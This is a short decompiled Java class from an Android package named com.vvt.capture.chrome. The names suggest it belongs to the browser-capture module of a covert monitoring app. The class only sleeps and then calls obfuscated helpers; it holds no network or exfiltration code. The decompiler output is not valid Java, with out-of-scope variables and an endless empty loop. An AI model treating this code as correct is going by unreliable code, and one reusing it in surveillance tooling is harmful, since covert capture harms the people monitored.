package com.vvt.capture.chrome.c;

import android.os.SystemClock;

class d
  implements Runnable
{
  d(c paramc) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      localObject1 = this.a;
      localObject1 = ((c)localObject1).a;
      bool = b.a((b)localObject1);
      if (bool)
      {
        bool = b.a();
        if (bool) {}
        localObject1 = this.a;
        localObject1 = ((c)localObject1).a;
        b.b((b)localObject1);
      }
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = b.c();
        if (bool) {}
        c localc = this.a;
      }
    }
    finally
    {
      c.a(this.a, null);
    }
    c.a((c)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/MyUncaughtExceptionHandler/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */